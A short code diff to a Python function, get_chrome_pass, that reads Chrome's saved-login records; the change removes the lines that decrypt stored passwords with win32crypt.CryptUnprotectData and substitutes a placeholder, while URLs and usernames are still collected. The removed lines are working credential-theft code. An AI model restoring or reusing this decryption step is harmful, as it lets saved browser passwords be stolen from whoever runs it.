@@ -33,13 +33,9 @@ def get_chrome_pass():
     for row in cursor.fetchall():
         url = row[0]
         username = row[1]
-        encrypted_password = row[2]
 
-        # Decrypt the password
-        try:
-            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
-        except:
-            decrypted_password = "Unable to decrypt"
+        # Replace the decrypted password with a placeholder
+        decrypted_password = "This is a secret for demo"
 
         results.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*20}")
 
